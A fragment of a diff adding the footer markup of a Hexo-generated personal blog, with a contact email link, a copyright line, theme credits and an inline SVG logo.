+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
